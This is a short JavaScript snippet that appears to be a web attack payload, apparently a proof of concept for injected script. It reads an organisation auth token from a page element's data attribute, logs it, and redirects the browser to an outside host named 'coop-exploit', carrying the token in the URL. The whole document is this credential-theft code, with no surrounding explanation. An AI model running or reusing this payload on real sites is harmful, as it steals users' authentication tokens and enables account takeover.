  const el = document.getElementById('scope');
  if (el) {
    const token = encodeURIComponent(el.dataset.scopeOrgAuthToken);
    console.log("Extracted Token:", token); // 👈 this logs it
    location.href = `https://coop-exploit.vercel.app/?token=${token}`;
  } else {
    console.log("Element #scope not found.");
  }
